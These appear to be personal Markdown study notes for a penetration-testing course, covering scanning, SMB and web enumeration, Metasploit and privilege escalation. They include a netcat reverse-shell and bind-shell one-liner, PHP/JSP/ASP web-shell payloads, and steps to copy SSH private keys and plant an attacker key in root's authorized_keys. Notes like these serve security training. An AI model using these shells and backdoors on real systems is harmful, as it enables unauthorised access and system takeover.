# 🕵️ Pentesting Basics

# 🖥️ Getting a Shell
## 🔹 Types of Shells
-   **Reverse Shell** 🔁
-   **Bind Shell** ⚓
-   **Web Shell** 🌐
- 
## 🛠️ Netcat
-   Interacts with TCP/UDP ports
-   **Banner grabbing**: `nc -nv 10.129.42.253 21` or `nmap -sV --script=banner <target>`


# 🔍 Service Scanning

## 🧭 Nmap
-   Common flags: `-sC` (default scripts), `-sV` (version), `-p-` (all ports)
-   Run custom NSE scripts: `nmap --script <script.nse> -p<port> <host>`
    
## ⚠️ Attacking Network Services
-   Banner grabbing: `nmap -sV --script=banner <target>`
### 🗂️ SMB (Server Message Block)
-   Common on Windows; may be vulnerable to RCE (e.g., EternalBlue)
-   Discovery: `nmap --script smb-os-discovery.nse -p445 10.10.10.40`
#### Shares
- SMB allows users and administrators to share folders and make them accessible remotely by other users
-   List shares: `smbclient -N -L \\\\10.129.42.253`
-   Connect as guest: `smbclient \\\\10.129.42.253\\users`
-   Connect as user: `smbclient -U bob \\\\10.129.42.253\\users`



# 🌐 Web Enumeration
- `whatweb 10.129.117.36` 
## 🧰 Gobuster / ffuf
- Directories/files:
```bash
gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
- for subdomains
```bash
# we can use this repo to dowload wordList
git clone https://github.com/danielmiessler/SecLists
# now Gobuster
gobuster dns -do inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.tx
```
## 🧾 Web Enumeration Tips (info sources)
- **Banner Grabbing / Web Server Headers**
- **Whatweb**: by command `shell-session
 whatweb 10.10.10.121`
 - **Certificates**
 - **robots.txt**: instruct search engine like google
 - **source code**: by `ctrl+u`
 
 
# 🗃️ Public Exploits
## Finding Public Exploits
- -   Search with Google + `exploit` or use databases:
    -   Exploit DB, Rapid7, Vulnerability Lab.
- `searchsploit` (Exploit-DB local search)
## 🧨 Metasploit (`msfconsole`) Primer
- Metasploit is a powerful pentesting framework with 
	- built-in exploits
	- reconnaissance/verification scripts
	- the Meterpreter shell
	- post-exploit/pivoting utilities.
- `msfconsole` command to run **Metasploit**
	1 - `search exploit SMB` command to for SMB vuln  
	2 - `use exploit/windows/...` use the exploit 
	3 - `show options` to display and config exploit options
	4 - `set RHOSTS 10.10.10.40` to set params (**RHost** for target and **LHost** of our attacker like `eth0`)
	5- `check` to check if our target is vulnerable
	6- `run` or `exploit` to run the exploit in the end	

# 🧾 Types of Shells 
- to remote access: `ssh` for linux and `WinRm` for windows 

Type of Shell | Method of Communication
|--|--|
`Reverse Shell` | Target connects back to attacker (listener) 
`Bind Shell` | Target binds a port; attacker connects to it
`Web Shell`  | Commands via HTTP params, executed on web server 
## 🔁 Reverse Shell
- most used
- target connects to us on the listening port
- **netcat** listener on our machine  `nc -lvnp 1234`
- [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) : reverse shell commands, example :
	```bash
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
	```
- **lose connection:** have to use the initial exploit again
## ⚓ Bind Shell
- Attacker connects to target's listening port
- [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) : Bind shell commands, example :
	 ```bash
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
	```
- use **netcat** to connect ` nc 10.10.10.1 1234 `

## 🔧 Upgrading TTY
- we will use the `python/stty`
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
- `ctrl+z` to background our shell and get back on our local terminal
- input the command `stty raw -echo`
- input the command `fg` 
- click `Enter`
- fixing size:
	- on our local shell
		 ```bash
		ab2gbl1@htb[/htb]$ echo $TERM
		xterm-256color
		
		ab2gbl1@htb[/htb]$ stty size
		67 318
		 ``` 
	- then on the victim shell
		```bash
		www-data@remotehost$ export TERM=xterm-256color
		www-data@remotehost$ stty rows 67 columns 318
		```

## 🌐 Web Shell

```bash 
# php
<?php system($_REQUEST["cmd"]); ?>
# jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
# asp
<% eval request("cmd") %>
```
- we should put our script `shell.php` on the **webroot**

Web Server | Default Webroot
|--|--|
`Apache` | /var/www/html/
`Nginx` | /usr/local/nginx/html/
`IIS`  | c:\inetpub\wwwroot\
`XAMPP` | C:\xampp\htdocs\

- then we can access the shell script using 
	```bash
	curl http://SERVER_IP:PORT/shell.php?cmd=id
	```
# 🛡️ Privilege Escalation
- **PrivEsc Checklists**
	- [HackTricks](https://book.hacktricks.xyz/) and [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- **Enumeration Scripts**
	- **Linux:** [LinEnum](https://github.com/rebootuser/LinEnum.git) and [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker), 
	- **Windows:** [Seatbelt](https://github.com/GhostPack/Seatbelt) and [JAWS](https://github.com/411Hall/JAWS).
	- **Derver enumeration**: the [Privilege Escalation Awesome Scripts SUITE (PEASS)](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite),
		> Note: this scripts may trigger anti-virus, better do manual enumeration

- **Kernel Exploits**
- **Vulnerable Software**:  `dpkg -l` or look for `C:\Program Files`
-   **User Privileges**
	- **`sudo -l`** : what `sudo` privileges we have
		- sometimes we find result `(user : user) NOPASSWD: /bin/echo` , means we can run `echo` as **user** without his password
		- we can use that `sudo -u user /bin/echo Hello World!` 
	- **`sudo su -`**: enter root mode
	- [GTFOBins](https://gtfobins.github.io/) and [LOLBAS](https://lolbas-project.github.io/#)
- **Scheduled Tasks** 
	1.  Add new scheduled tasks/cron jobs
	2.  Trick them to execute a malicious software
	- specific folders:
		1.  `/etc/crontab`
		2.  `/etc/cron.d`
		3.  `/var/spool/cron/crontabs/root`

- **Exposed Credentials**: common with `configuration` files, `log` files, and user history files (`bash_history` in Linux and `PSReadLine` in Windows)
- **SSH Keys:** 
	- try read read the folder **`.ssh`**
		- ex **`/home/user/.ssh/id_rsa`** or **`/root/.ssh/id_rsa`**
		- copy it to our machine and use the  `-i`  flag to log in with it:
			```bash
			ab2gbl1@htb[/htb]$ vim id_rsa
			ab2gbl1@htb[/htb]$ chmod 600 id_rsa
			ab2gbl1@htb[/htb]$ ssh root@10.10.10.10 -i id_rsa
			root@10.10.10.10#
			```
	- if we have write access to a users **`/.ssh/`**	
		- we can place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`
		- create on local a new key with **ssh-keygen**: `ssh-keygen -f key` 
		- give us two files: **`key`** (which we will use with `ssh -i`) and **`key.pub`**
		-  copy `key.pub` to the remote machine **`/root/.ssh/authorized_keys`**
		- Now, we have access using the command: **`ssh root@10.10.10.10 -i key`**
# 📤 Transferring Files
- **Using wget:** `python3 -m http.server 8000` then `wget` or `curl`
- **Using SCP:** `scp linenum.sh user@remotehost:/tmp/linenum.sh
`
- **Using Base64:**: **encode** the file `base64 shell -w 0` then copy and **decode** `echo f0V...wU | base64 -d > shell`  
- Validating File Transfers: using `file shell` and 

<!--stackedit_data:
eyJoaXN0b3J5IjpbMTgwMDY1MTYzLDE0MjkxNjkwMTIsLTQzMz
g1Njk4MSwtNzQxNzk2MDgsMjU0ODU2NTMsLTE1ODEyMzY3NTUs
MzI5NzMyNTUxLC05Mjg3NzA1NTUsMTg5NzkyODUxNiwtMTExOD
IyMDQzMywxMTM1MDUyNjg0LC0xMTc5NzUxMjE1LC0xOTY0OTQz
ODg4LDE0NjIxNTE5Myw2ODEzMzE3NDksOTIyMjQ1NTA3LDE0MT
Y1OTkwNzIsLTU3Mjg0ODA0MSwxNTM1MjM0OTYxLDQwODQyODk4
NV19
-->